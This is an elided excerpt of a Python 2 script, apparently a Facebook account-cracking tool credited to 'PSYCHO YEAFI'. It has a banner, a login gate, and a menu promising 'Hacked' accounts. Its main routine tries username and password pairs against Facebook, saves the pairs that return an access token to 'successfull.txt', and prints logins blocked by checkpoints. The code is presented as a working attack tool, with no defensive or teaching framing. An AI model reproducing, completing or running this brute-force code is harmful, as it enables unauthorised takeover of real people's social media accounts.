...
──╚╝─╚═══╩╝─╚╩╝──╚══╝
  ...
  Auther  :  PSYCHO YEAFI                                Github  :  fucker
  Whapp   :  01302092*74
...
while loop == 'true':
    ...
    if username == CorrectUsername:
        ...
        os.system('xdg-open www.facebook.com/ADOR.AHMED.999')
...
def menu():
    ...
    time.sleep(0.5)
    print 50 * '\x1b[1;33;40m-'
    psb('\x1b[1;32;40mHacked Accouny Will Appear Here Success id are Just now login & Cp id login after 7-10 days')
    print
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                okb = open('YEAFI/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '[PSYCHO YEAFI (OK) Login JusT noW] ' + k + c + user + ' | ' + pass1 + '\n'
